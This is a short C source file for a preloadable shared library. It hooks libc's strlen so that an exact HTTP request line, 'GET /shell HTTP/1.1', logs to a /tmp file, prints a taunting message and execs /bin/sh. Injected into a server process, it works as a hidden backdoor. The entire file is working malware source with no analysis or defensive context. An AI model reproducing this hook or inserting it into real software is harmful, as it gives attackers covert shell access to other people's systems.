#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <dirent.h>

static void *dl;
size_t (*orig_strlen)(const char *);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.6", RTLD_LAZY | RTLD_GLOBAL);
	orig_strlen = dlsym(dl, "strlen");
	
}

size_t strlen(const char *s)
{
	FILE *fp;
	char filename[1024+1];
	
	if (!strcmp(s, "GET /shell HTTP/1.1"))
	{
		snprintf(filename, sizeof(filename), "/tmp/mal-%d.log", getpid());
		fp = fopen(filename, "a");
		if ((fp))
		{
	
			fprintf(fp, "Attempting to start shell!\n");
			fclose(fp);
		}
		
		printf("Muahahaha!\n");
		
		execl("/bin/sh", "sh", NULL);
	}
	
	return orig_strlen(s);
}
